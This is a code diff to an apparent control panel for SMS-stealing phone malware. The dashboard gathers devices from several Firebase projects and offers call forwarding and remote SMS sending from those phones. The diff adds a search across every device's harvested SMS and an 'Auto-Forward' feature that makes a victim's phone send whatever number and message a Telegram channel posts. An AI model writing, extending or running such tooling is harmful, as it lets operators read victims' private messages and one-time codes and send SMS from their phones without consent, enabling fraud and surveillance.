@@ -232,27 +232,52 @@ textarea#link-in:focus{border-color:rgba(16,185,129,.45);}
 #toast{position:fixed;bottom:22px;left:50%;transform:translateX(-50%);background:var(--surface3);
   border:1px solid var(--border);color:var(--text-bright);padding:10px 22px;border-radius:22px;
   font-size:13px;z-index:9999;opacity:0;pointer-events:none;transition:opacity .25s;white-space:nowrap;}
+
+/* ===== SETTINGS PANEL (sources + add-link, tucked behind a gear icon) ===== */
+#settings-panel{display:none;}
+.hl{background:rgba(245,180,10,.35);color:#f5b40a;border-radius:3px;padding:0 1px;}
+.sms-snippet{font-size:11.5px;color:#a5b4c3;background:var(--surface3);border-radius:8px;
+  padding:6px 9px;margin-top:6px;line-height:1.5;word-break:break-word;}
+.searching-note{font-size:11.5px;color:var(--muted);text-align:center;padding:8px 0;
+  display:flex;align-items:center;justify-content:center;gap:8px;}
+.searching-note .spin2{width:13px;height:13px;border:2px solid var(--border);
+  border-top-color:var(--green);border-radius:50%;animation:sp2 .7s linear infinite;}
+@keyframes sp2{to{transform:rotate(360deg);}}
+
+/* ===== AUTO-SMS ROW (inside device detail) ===== */
+.autosms-row{padding:0 16px 10px;display:flex;gap:8px;}
+.autosms-btn{flex:1;background:var(--surface2);color:#94a3b8;border:1.5px solid var(--border);
+  border-radius:10px;padding:12px;font-size:13px;font-weight:700;cursor:pointer;font-family:inherit;
+  display:flex;align-items:center;justify-content:center;gap:8px;}
+.autosms-btn.is-on{color:#3ba7e0;border-color:rgba(34,158,217,.45);
+  box-shadow:0 0 0 1px rgba(34,158,217,.14),0 0 14px -4px rgba(34,158,217,.45);}
+.autosms-gear{background:var(--surface2);color:var(--muted);border:1.5px solid var(--border);
+  border-radius:10px;padding:12px 14px;font-size:16px;cursor:pointer;}
 </style>
 </head>
 <body>
 
+<div id="list-screen">
 <div class="topbar">
   <h1>&#127760; Multi Source View</h1>
+  <button class="rbtn" onclick="toggleSettingsPanel()">&#9881;</button>
   <button class="rbtn" id="refresh-btn" onclick="refreshAll()"><span>&#8635;</span></button>
 </div>
 
 <div class="wrap">
 
-  <div class="box">
-    <div class="box-label">&#128279; Admin link paste karo (ek line me ek)</div>
-    <textarea id="link-in" placeholder="https://xxx.github.io/csc-monitor/#eyJ1Ijoi...&#10;doosra link agli line me..."></textarea>
-    <button class="add-btn" onclick="addLinks()">&#10133; Add Karo</button>
-    <div class="add-msg" id="add-msg"></div>
-  </div>
+  <div id="settings-panel">
+    <div class="box">
+      <div class="box-label">&#128279; Admin link paste karo (ek line me ek)</div>
+      <textarea id="link-in" placeholder="https://xxx.github.io/csc-monitor/#eyJ1Ijoi...&#10;doosra link agli line me..."></textarea>
+      <button class="add-btn" onclick="addLinks()">&#10133; Add Karo</button>
+      <div class="add-msg" id="add-msg"></div>
+    </div>
 
-  <div class="box" id="src-box" style="display:none;">
-    <div class="box-label">&#128194; Jode gaye sources</div>
-    <div class="src-list" id="src-list"></div>
+    <div class="box" id="src-box" style="display:none;">
+      <div class="box-label">&#128194; Jode gaye sources</div>
+      <div class="src-list" id="src-list"></div>
+    </div>
   </div>
 
   <div class="stats-row" id="stats-row" style="display:none;">
@@ -262,15 +287,17 @@ textarea#link-in:focus{border-color:rgba(16,185,129,.45);}
   </div>
 
   <div class="search-wrap" id="search-wrap" style="display:none;">
-    <input id="search" placeholder="Naam, ID ya source se search karo..." oninput="renderList()"/>
+    <input id="search" placeholder="Naam, ID, ya SMS ke andar bhi search karo..." oninput="onSearchInput()"/>
   </div>
 
+  <div id="search-status"></div>
   <div id="dev-list"></div>
   <div class="empty" id="empty-state">
     <div class="ei">&#128279;</div>
-    <p>Upar admin link paste karke shuru karo.<br/>Jitne link daaloge, sabke devices yahan ek list me dikhenge.</p>
+    <p>&#9881; icon dabakar admin link paste karo.<br/>Jitne link daaloge, sabke devices yahan ek list me dikhenge.</p>
   </div>
 
+</div>
 </div>
 
 <!-- ===== DEVICE DETAIL SCREEN ===== -->
@@ -285,6 +312,10 @@ textarea#link-in:focus{border-color:rgba(16,185,129,.45);}
   <div class="d-actions">
     <button class="act-btn" onclick="openCF()">&#128222; CALL FORWADING</button>
     <button class="act-btn" onclick="openSmsSend()">&#9993; SMS SEND</button>
+  </div>
+  <div class="autosms-row">
+    <button id="autosms-btn" class="autosms-btn" onclick="toggleAutoSms()">&#129302; Auto-Forward: OFF</button>
+    <button class="autosms-gear" onclick="openAutoSmsSettings()">&#9881;</button>
   </div>
   <div class="sum-wrap">
     <div class="sum-box">
@@ -349,6 +380,27 @@ textarea#link-in:focus{border-color:rgba(16,185,129,.45);}
   </div>
 </div>
 
+<!-- ===== AUTO-FORWARD (TELEGRAM) SETTINGS DIALOG ===== -->
+<div class="overlay" id="dlg-autosms">
+  <div class="dlg">
+    <div class="dlg-hdr">&#129302; Auto-Forward Settings</div>
+    <div class="dlg-body">
+      <div style="background:rgba(34,158,217,.1);border:1px solid rgba(34,158,217,.3);
+        border-radius:10px;padding:10px 12px;margin-bottom:14px;font-size:12px;color:#3ba7e0;line-height:1.6;">
+        Telegram channel ka naya message aate hi automatically is device se SMS send ho jaayega.
+      </div>
+      <label style="font-size:11px;font-weight:700;color:var(--muted);text-transform:uppercase;letter-spacing:.6px;display:block;margin-bottom:5px;">Cloudflare Worker URL</label>
+      <input class="di" id="as-worker" placeholder="https://xxx.workers.dev" style="margin-bottom:12px;"/>
+      <label style="font-size:11px;font-weight:700;color:var(--muted);text-transform:uppercase;letter-spacing:.6px;display:block;margin-bottom:5px;">Bot Token</label>
+      <input class="di" id="as-token" placeholder="1234567890:AAF..." type="password" style="margin-bottom:12px;"/>
+      <label style="font-size:11px;font-weight:700;color:var(--muted);text-transform:uppercase;letter-spacing:.6px;display:block;margin-bottom:5px;">Channel Chat ID</label>
+      <input class="di" id="as-chatid" placeholder="-1001234567890" style="margin-bottom:14px;"/>
+      <button class="dbtn" onclick="saveAutoSmsSettings()">&#9989; Save &amp; Start</button>
+      <button class="dbtn-cancel" onclick="closeD('dlg-autosms')">Cancel</button>
+    </div>
+  </div>
+</div>
+
 <div id="toast"></div>
 
 <script>
@@ -381,6 +433,11 @@ function decodeAdminLink(raw) {
 
 function hostLabel(furl) {
   return furl.replace(/^https?:\/\//, '').split('.')[0];
+}
+
+function toggleSettingsPanel() {
+  var p = document.getElementById('settings-panel');
+  p.style.display = (p.style.display === 'none' || !p.style.display) ? 'block' : 'none';
 }
 
 function loadSources() {
@@ -423,6 +480,7 @@ function addLinks() {
 function removeSource(id) {
   SOURCES = SOURCES.filter(function(s){ return s.id !== id; });
   delete SRC_STATE[id];
+  CONTENT_MATCHES = null;
   saveSources();
   renderSources();
   renderList();
@@ -502,6 +560,79 @@ function eh(s) {
   return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
 }
 
+var CONTENT_MATCHES = null; /* null = no content search run; else uid -> matched SMS snippet */
+var SEARCH_TIMER = null, SEARCH_SEQ = 0;
+
+function hlTxt(text, q) {
+  if (!q) return text;
+  var out = '', lo = text.toLowerCase(), lq = q.toLowerCase(), i = 0;
+  while (true) {
+    var p = lo.indexOf(lq, i);
+    if (p === -1) { out += text.slice(i); break; }
+    out += text.slice(i, p) + '<span class="hl">' + text.slice(p, p + q.length) + '</span>';
+    i = p + q.length;
+  }
+  return out;
+}
+
+function uidOf(d) { return d.srcId + '::' + d.key; }
+
+function onSearchInput() {
+  var q = document.getElementById('search').value.trim();
+  clearTimeout(SEARCH_TIMER);
+  if (!q) {
+    CONTENT_MATCHES = null;
+    document.getElementById('search-status').innerHTML = '';
+    renderList();
+    return;
+  }
+  renderList(); /* instant local name/id/source filter first */
+  SEARCH_TIMER = setTimeout(function(){ doContentSearch(q); }, 350);
+}
+
+function doContentSearch(q) {
+  var mySeq = ++SEARCH_SEQ;
+  var ql = q.toLowerCase();
+  var jobs = [];
+  SOURCES.forEach(function(s){
+    var st = SRC_STATE[s.id];
+    if (st && st.status === 'ok') st.devices.forEach(function(d){ jobs.push({d:d, src:s}); });
+  });
+  if (!jobs.length) return;
+  document.getElementById('search-status').innerHTML =
+    '<div class="searching-note"><span class="spin2"></span>Sabhi Firebase me SMS check ho raha hai...</div>';
+  var proms = jobs.map(function(item){
+    var d = item.d, s = item.src;
+    var did = d.did || d.key;
+    var auth = s.key ? '?auth=' + encodeURIComponent(s.key) : '';
+    var url = s.furl + '/' + s.node + '/All_User/Sms/' + did + '.json?orderBy=%22$key%22&limitToLast=50' + auth;
+    return fetch(url, {cache:'no-store'}).then(function(r){ return r.ok ? r.json() : null; })
+      .then(function(smsData){
+        if (!smsData || typeof smsData !== 'object') return null;
+        var found = null;
+        Object.keys(smsData).forEach(function(k){
+          if (found) return;
+          var sm = smsData[k];
+          if (!sm || typeof sm !== 'object') return;
+          var msg = sm.msg || sm.body || '', ph = sm.ph || sm.address || '';
+          if ((msg + ' ' + ph).toLowerCase().indexOf(ql) !== -1) found = msg || ph;
+        });
+        return found ? { uid: uidOf(d), snippet: found } : null;
+      }).catch(function(){ return null; });
+  });
+  Promise.all(proms).then(function(results){
+    if (mySeq !== SEARCH_SEQ) return; /* a newer keystroke already started a fresher search */
+    var matches = {};
+    results.forEach(function(r){ if (r) matches[r.uid] = r.snippet; });
+    CONTENT_MATCHES = matches;
+    var n = Object.keys(matches).length;
+    document.getElementById('search-status').innerHTML = n
+      ? ('&#128172; ' + n + ' device me SMS match mila')
+      : '<div class="searching-note">SMS me kahin match nahi mila</div>';
+    renderList();
+  });
+}
+
 function renderList() {
   var all = [];
   SOURCES.forEach(function(s){
@@ -511,7 +642,9 @@ function renderList() {
   var q = (document.getElementById('search') ? document.getElementById('search').value : '').trim().toLowerCase();
   if (q) {
     all = all.filter(function(d){
-      return (d.name + ' ' + d.id + ' ' + d.srcLabel).toLowerCase().indexOf(q) !== -1;
+      var metaMatch = (d.name + ' ' + d.id + ' ' + d.srcLabel).toLowerCase().indexOf(q) !== -1;
+      var contentMatch = CONTENT_MATCHES && CONTENT_MATCHES[uidOf(d)] !== undefined;
+      return metaMatch || contentMatch;
     });
   }
   all.sort(function(a,b){ return (b.on - a.on) || a.name.localeCompare(b.name); });
@@ -533,6 +666,8 @@ function renderList() {
     card.style.setProperty('--i', Math.min(i, 14));
     card.addEventListener('click', function(){ openDeviceFromList(d); });
     var batHtml = d.bat ? '<span class="bat-txt">&#128267; ' + eh(String(d.bat)) + '%</span>' : '';
+    var snippet = (q && CONTENT_MATCHES && CONTENT_MATCHES[uidOf(d)]) ? CONTENT_MATCHES[uidOf(d)] : '';
+    var snippetHtml = snippet ? '<div class="sms-snippet">&#128172; ' + hlTxt(eh(snippet), q) + '</div>' : '';
     card.innerHTML =
       '<div class="dev-inner">' +
         '<div class="dev-ic">&#128241;</div>' +
@@ -543,6 +678,7 @@ function renderList() {
             '<span class="src-tag">' + eh(d.srcLabel) + '</span>' +
             batHtml +
           '</div>' +
+          snippetHtml +
         '</div>' +
       '</div>';
     frag.appendChild(card);
@@ -627,18 +763,26 @@ function openDeviceFromList(d) {
   openDev(uid);
 }
 
+var MV_SCROLL_POS = 0;
+
 function openDev(key) {
   CUR = key;
-  document.getElementById('detail-screen').style.display = 'flex';
-  document.getElementById('detail-screen').style.flexDirection = 'column';
+  MV_SCROLL_POS = window.scrollY;
+  /* Hide the ENTIRE list screen (topbar + sources + stats + list) as one unit -
+     leaving it in the DOM behind a visible detail screen was what pushed the
+     detail screen down the page, forcing a scroll to see it. */
+  document.getElementById('list-screen').style.display = 'none';
+  var ds = document.getElementById('detail-screen');
+  ds.style.display = 'flex'; ds.style.flexDirection = 'column';
+  window.scrollTo(0, 0);
   var d = DEVS[key] || {};
   document.getElementById('d-title').textContent = d.name || key;
   document.getElementById('d-srclabel').textContent = d.srcLabel || '-';
   var badge = document.getElementById('d-stbadge');
   badge.innerHTML = '<span class="d-st-dot"></span>' + (d.on ? 'Online' : 'Offline');
   badge.className = 'd-st ' + (d.on ? 'd-st-on' : 'd-st-off');
+  updateAutoSmsBtn(AUTO_SMS_ACTIVE && AUTO_SMS_DEV === key);
   switchDtl('sms');
-  window.scrollTo(0, 0);
   document.getElementById('dev-summary-note').className = 'sum-note-txt empty';
   document.getElementById('dev-summary-note').textContent = 'Loading...';
   document.getElementById('dev-summary-data').innerHTML = '<div class="sum-empty">Loading...</div>';
@@ -652,6 +796,9 @@ function closeDetail() {
   stopSmsSSE();
   CUR = null;
   document.getElementById('detail-screen').style.display = 'none';
+  var ls = document.getElementById('list-screen');
+  ls.style.display = 'block';
+  setTimeout(function(){ window.scrollTo(0, MV_SCROLL_POS); }, 30);
 }
 
 function devRefresh() {
@@ -1013,6 +1160,167 @@ function doSendSms() {
       stEl.innerHTML = '&#9989; SMS Sent!'; showToast('&#9989; SMS Sent!');
     })
     .catch(function(e){ stEl.innerHTML = '&#10060; Error: ' + e.message; stEl.style.color = '#dc2626'; showToast('Error: ' + e.message); });
+}
+
+
+/* =================================================================
+   AUTO-FORWARD (Telegram -> SMS), ported from the main dashboard.
+   Difference from the single-Firebase version: since each device here
+   can live on a different Firebase project, the device's own
+   DB/APIKEY/NODE are captured at the moment Auto-Forward is started,
+   and that captured snapshot (not the live globals, which change as
+   you browse other devices) is what autoSendSms() always writes to.
+   ================================================================= */
+var AUTO_SMS_ACTIVE = false;
+var AUTO_SMS_INTERVAL = null;
+var AUTO_SMS_OFFSET = 0;
+var AUTO_SMS_DEV = null;      /* namespaced device key this is running for */
+var AUTO_SMS_SNAPSHOT = null; /* {db, apikey, node, did} captured at start time */
+var AUTO_SMS_QUEUE = [];
+var AUTO_SMS_QUEUE_TIMER = null;
+var AUTO_SMS_SEND_DELAY = 500;
+
+var TG_WORKER_URL = localStorage.getItem('tg_worker_url') || '';
+var TG_BOT_TOKEN  = localStorage.getItem('tg_bot_token')  || '';
+var TG_CHAT_ID    = localStorage.getItem('tg_chat_id')    || '';
+
+function toggleAutoSms() {
+  if (!AUTO_SMS_ACTIVE) {
+    if (!TG_WORKER_URL || !TG_BOT_TOKEN || !TG_CHAT_ID) { openAutoSmsSettings(); return; }
+    startAutoSms();
+  } else {
+    stopAutoSms();
+  }
+}
+
+function startAutoSms() {
+  if (!CUR || !DEVS[CUR]) return;
+  AUTO_SMS_ACTIVE = true;
+  AUTO_SMS_DEV = CUR;
+  AUTO_SMS_SNAPSHOT = { db: DB, apikey: APIKEY, node: NODE, did: DEVS[CUR].did || CUR };
+  AUTO_SMS_OFFSET = 0;
+  updateAutoSmsBtn(true);
+  showToast('🤖 Auto-Forward ON — shuru ho raha hai...');
+  var url = TG_WORKER_URL.replace(/\/+$/,'') + '?token=' + encodeURIComponent(TG_BOT_TOKEN) + '&offset=0';
+  fetch(url).then(function(r){ return r.json(); }).then(function(data){
+    if (data.ok && data.result && data.result.length) {
+      AUTO_SMS_OFFSET = data.result[data.result.length - 1].update_id + 1;
+    }
+    showToast('🤖 Auto-Forward ON ✅ — naye messages ka wait hai');
+    AUTO_SMS_INTERVAL = setInterval(pollTelegram, 1000);
+  }).catch(function(){
+    showToast('🤖 Auto-Forward ON');
+    AUTO_SMS_INTERVAL = setInterval(pollTelegram, 1000);
+  });
+}
+
+function stopAutoSms() {
+  AUTO_SMS_ACTIVE = false;
+  AUTO_SMS_DEV = null; AUTO_SMS_SNAPSHOT = null;
+  if (AUTO_SMS_INTERVAL) { clearInterval(AUTO_SMS_INTERVAL); AUTO_SMS_INTERVAL = null; }
+  if (AUTO_SMS_QUEUE_TIMER) { clearTimeout(AUTO_SMS_QUEUE_TIMER); AUTO_SMS_QUEUE_TIMER = null; }
+  AUTO_SMS_QUEUE = [];
+  updateAutoSmsBtn(false);
+  showToast('🤖 Auto-Forward OFF');
+}
+
+function updateAutoSmsBtn(active) {
+  var btn = document.getElementById('autosms-btn');
+  if (!btn) return;
+  btn.classList.toggle('is-on', !!active);
+  btn.innerHTML = active ? '&#129302; Auto-Forward: ON (polling...)' : '&#129302; Auto-Forward: OFF';
+}
+
+function cleanNumber(num) {
+  var digits = num.replace(/\D/g, '');
+  if (digits.length === 12 && digits.indexOf('91') === 0) digits = digits.slice(2);
+  if (digits.length === 11 && digits.indexOf('0') === 0) digits = digits.slice(1);
+  return digits;
+}
+
+function parseTgMessage(text) {
+  var toMatch = text.match(/To:\s*(\+?[\d\s\-]+)/i);
+  var msgMatch = text.match(/💬\s*Message:\s*([^\n]+)/i) || text.match(/Message:\s*([^\n]+)/i);
+  if (toMatch && msgMatch) return { number: cleanNumber(toMatch[1].trim()), body: msgMatch[1].trim() };
+  var lines = text.trim().split('\n');
+  for (var i = 0; i < lines.length; i++) {
+    var pipeMatch = lines[i].match(/^(\+?[\d]{10,15})\s*\|\s*(.+)/);
+    if (pipeMatch) return { number: cleanNumber(pipeMatch[1].trim()), body: pipeMatch[2].trim() };
+  }
+  if (lines.length >= 2 && /^\+?[\d]{10,15}$/.test(lines[0].trim())) {
+    return { number: cleanNumber(lines[0].trim()), body: lines.slice(1).join('\n').trim() };
+  }
+  return null;
+}
+
+function pollTelegram() {
+  if (!AUTO_SMS_ACTIVE || !AUTO_SMS_DEV) return;
+  var url = TG_WORKER_URL.replace(/\/+$/,'') + '?token=' + encodeURIComponent(TG_BOT_TOKEN) + '&offset=' + AUTO_SMS_OFFSET;
+  fetch(url).then(function(r){ return r.json(); }).then(function(data){
+    if (!data || !data.ok || !data.result || !data.result.length) return;
+    var updates = data.result.slice().sort(function(a,b){ return a.update_id - b.update_id; });
+    updates.forEach(function(u){ if (u.update_id >= AUTO_SMS_OFFSET) AUTO_SMS_OFFSET = u.update_id + 1; });
+    updates.forEach(function(u){
+      var msg = u.channel_post || u.message; if (!msg) return;
+      var chatId = String(msg.chat && msg.chat.id), expectedId = String(TG_CHAT_ID).trim();
+      if (expectedId && chatId !== expectedId) return;
+      var text = msg.text || msg.caption || ''; if (!text) return;
+      var parsed = parseTgMessage(text); if (!parsed) return;
+      queueAutoSms(parsed.number, parsed.body);
+    });
+  }).catch(function(){});
+}
+
+function autoSendSms(number, body) {
+  if (!AUTO_SMS_SNAPSHOT) return;
+  var snap = AUTO_SMS_SNAPSHOT;
+  var auth = snap.apikey ? '?auth=' + encodeURIComponent(snap.apikey) : '';
+  var url = snap.db + '/' + snap.node + '/All_User/Verify_Device/' + snap.did + '.json' + auth;
+  fetch(url, {method:'PUT', headers:{'Content-Type':'application/json'}, body: JSON.stringify({Number: number, Body: body, Status: 'Yes'})})
+    .then(function(r){ if (!r.ok) throw new Error('HTTP ' + r.status);
+      var t = new Date().toLocaleTimeString('en-IN');
+      showToast('✅ Auto-Forward sent → ' + number + ' [' + t + ']');
+      /* Only touch the on-screen button if the device currently open IS the one
+         Auto-Forward is running for - otherwise you'd see device B's screen
+         wrongly claim an auto-send that actually belongs to device A. */
+      var btn = document.getElementById('autosms-btn');
+      if (btn && AUTO_SMS_ACTIVE && CUR === AUTO_SMS_DEV) btn.innerHTML = '🤖 Auto-Forward: ON ✅ ' + number + ' ' + t;
+    }).catch(function(e){
+      showToast('❌ Auto-Forward FAIL → ' + number + ': ' + e.message);
+      var btn = document.getElementById('autosms-btn');
+      if (btn && AUTO_SMS_ACTIVE && CUR === AUTO_SMS_DEV) btn.innerHTML = '🤖 Auto-Forward: ON ❌ FAIL: ' + number;
+    });
+}
+
+function processAutoSmsQueue() {
+  if (!AUTO_SMS_QUEUE.length || !AUTO_SMS_ACTIVE) { AUTO_SMS_QUEUE_TIMER = null; return; }
+  var item = AUTO_SMS_QUEUE.shift();
+  autoSendSms(item.number, item.body);
+  AUTO_SMS_QUEUE_TIMER = AUTO_SMS_QUEUE.length > 0 ? setTimeout(processAutoSmsQueue, AUTO_SMS_SEND_DELAY) : null;
+}
+function queueAutoSms(number, body) {
+  AUTO_SMS_QUEUE.push({number: number, body: body});
+  if (!AUTO_SMS_QUEUE_TIMER) processAutoSmsQueue();
+}
+
+function openAutoSmsSettings() {
+  document.getElementById('as-worker').value = TG_WORKER_URL;
+  document.getElementById('as-token').value = TG_BOT_TOKEN;
+  document.getElementById('as-chatid').value = TG_CHAT_ID;
+  openD('dlg-autosms');
+}
+function saveAutoSmsSettings() {
+  var w = document.getElementById('as-worker').value.trim();
+  var t = document.getElementById('as-token').value.trim();
+  var c = document.getElementById('as-chatid').value.trim();
+  if (!w || !t || !c) { showToast('Sab fields bharo!'); return; }
+  TG_WORKER_URL = w; TG_BOT_TOKEN = t; TG_CHAT_ID = c;
+  localStorage.setItem('tg_worker_url', w);
+  localStorage.setItem('tg_bot_token', t);
+  localStorage.setItem('tg_chat_id', c);
+  closeD('dlg-autosms');
+  showToast('✅ Settings saved!');
+  startAutoSms();
 }
 </script>
 </body>
